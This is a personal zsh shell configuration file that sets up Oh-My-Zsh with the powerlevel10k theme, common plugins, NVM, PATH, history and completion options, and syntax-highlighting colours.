# ── Oh-My-Zsh ────────────────────────────────────────────────────
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="powerlevel10k/powerlevel10k"
DISABLE_AUTO_UPDATE="true"
DISABLE_AUTO_TITLE="true"

plugins=(
  git
  sudo
  colored-man-pages
  extract
  zsh-autosuggestions
  zsh-syntax-highlighting
)

if [[ -f "$ZSH/oh-my-zsh.sh" ]]; then
  source "$ZSH/oh-my-zsh.sh"
  [[ -f "$HOME/.p10k.zsh" ]] && source "$HOME/.p10k.zsh"
else
  autoload -U colors && colors
  PROMPT=$'\n%F{135}⚡%f %F{51}%n@%m%f %F{240}%~%f\n%F{201}❯%f '
  [[ -f /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]] && \
    source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
  [[ -f /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh ]] && \
    source /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
fi

# ── NVM ──────────────────────────────────────────────────────────
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"

# ── PATH ─────────────────────────────────────────────────────────
export PATH="$HOME/.local/bin:$HOME/bin:$PATH"

# ── ENVIRONMENT ──────────────────────────────────────────────────
export COLORTERM=truecolor
export TERM=xterm-256color
export EDITOR=vim
export LANG=en_US.UTF-8
printf '\e[?12;25h'

# ── COMPLETION ───────────────────────────────────────────────────
autoload -U compinit && compinit -u
zstyle ':completion:*' menu select
setopt HIST_IGNORE_DUPS SHARE_HISTORY
HISTSIZE=10000; SAVEHIST=10000; HISTFILE=~/.zsh_history

# ── SYNTAX HIGHLIGHTING COLORS ───────────────────────────────────
ZSH_HIGHLIGHT_HIGHLIGHTERS=(main)
typeset -A ZSH_HIGHLIGHT_STYLES 2>/dev/null || true
ZSH_HIGHLIGHT_STYLES[command]='fg=51'
ZSH_HIGHLIGHT_STYLES[alias]='fg=201'
ZSH_HIGHLIGHT_STYLES[builtin]='fg=220'
ZSH_HIGHLIGHT_STYLES[function]='fg=46'
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=240"

